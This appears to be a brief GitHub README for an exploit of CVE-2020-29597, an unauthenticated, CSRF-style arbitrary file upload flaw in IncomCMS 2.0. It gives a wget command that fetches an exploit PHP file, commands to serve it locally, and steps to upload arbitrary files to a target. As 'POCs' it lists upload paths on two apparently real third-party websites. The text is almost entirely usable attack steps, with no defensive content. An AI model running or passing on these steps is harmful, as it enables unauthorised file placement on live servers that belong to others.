# CVE-2020-29597
Csrf file upload insecure

CVE-2020-29597 - IncomCMS 2.0 insecure files upload


Hi there!, I’ve discovered endpoint that accepts any file and upload it without any validation or even being authentication

CVE-ID : CVE-2020-29597
<br>
wget https://raw.githubusercontent.com/trhacknon/CVE-2020-29597/main/exp.php<br>
php -S 127.0.0.1:8080
<br>In your browser open http://127.0.0.1:8080/exp.php
<br>And upload your files (tested:jpg,png) 
POCs : http://mzgesheft.kz/upload/userfiles/image/tr.jpg
<br>http://mekom.kz/upload/userfiles/image/tr.jpg
